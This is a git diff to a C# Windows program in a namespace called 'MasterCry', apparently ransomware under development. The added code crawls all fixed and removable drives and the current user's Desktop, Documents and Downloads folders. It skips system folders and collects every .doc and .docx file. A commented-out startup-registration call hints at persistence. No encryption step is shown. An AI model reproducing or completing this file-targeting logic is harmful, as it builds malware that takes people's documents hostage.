@@ -15,6 +15,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
@@ -107,6 +108,82 @@ namespace MasterCry
             //{
             //    RegisterInStartup(true);
             //}
+
+            foreach (var drv in getDrives())
+            {
+                var data = GetFileList(drv);
+                foreach (var item in data)
+                {
+                    Console.WriteLine(item);
+                    //listBox1.Items.Add(item);
+                }
+            }
         }
+        #region "Search Files on Drives"
+        List<string> getDrives()
+        {
+            DriveInfo[] allDrives = DriveInfo.GetDrives();
+            List<string> listRange = new List<string>();
+
+            foreach (DriveInfo d in allDrives)
+            {
+
+                if (d.DriveType == DriveType.Fixed || d.DriveType == DriveType.Removable)
+                {
+                    if (d.Name.Equals(OSDrive()))
+                    {
+                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Desktop");
+                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Documents");
+                        listRange.Add(d.Name + @"Users\" + Environment.UserName + @"\Downloads");
+                    }
+                    else
+                        listRange.Add(d.Name);
+                }
+            }
+            return listRange;
+        }
+        public IEnumerable<string> GetFileList(string rootFolderPath)
+        {
+            string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
+            @"D:\System Volume Information", @"D:\$RECYCLE.BIN",
+            @"E:\System Volume Information", @"E:\$RECYCLE.BIN",
+            @"F:\System Volume Information", @"F:\$RECYCLE.BIN",
+            @"G:\System Volume Information", @"G:\$RECYCLE.BIN",
+            @"H:\System Volume Information", @"H:\$RECYCLE.BIN",
+            @"I:\System Volume Information", @"I:\$RECYCLE.BIN",
+            @"J:\System Volume Information", @"J:\$RECYCLE.BIN",
+            @"K:\System Volume Information", @"K:\$RECYCLE.BIN",
+            @"L:\System Volume Information", @"L:\$RECYCLE.BIN",
+            @"M:\System Volume Information", @"M:\$RECYCLE.BIN"};
+
+            Queue<string> pending = new Queue<string>();
+            pending.Enqueue(rootFolderPath);
+            string[] tmp;
+            while (pending.Count > 0)
+            {
+                rootFolderPath = pending.Dequeue();
+                try
+                {
+                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).Union(Directory.GetFiles(rootFolderPath).Where(files => exceptions.All(e => !files.StartsWith(e)) && files.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase)).Where(d => exceptions.All(e => !d.StartsWith(e)))).ToArray();
+
+                }
+                catch (UnauthorizedAccessException) { continue; }
+                catch (DirectoryNotFoundException) { continue; }
+                for (int i = 0; i < tmp.Length; i++)
+                {
+                    yield return tmp[i];
+                }
+                tmp = Directory.GetDirectories(rootFolderPath);
+                for (int i = 0; i < tmp.Length; i++)
+                {
+                    pending.Enqueue(tmp[i]);
+                }
+            }
+        }
+        private string OSDrive()
+        {
+            return Path.GetPathRoot(Environment.SystemDirectory);
+        }
+#endregion
     }
 }
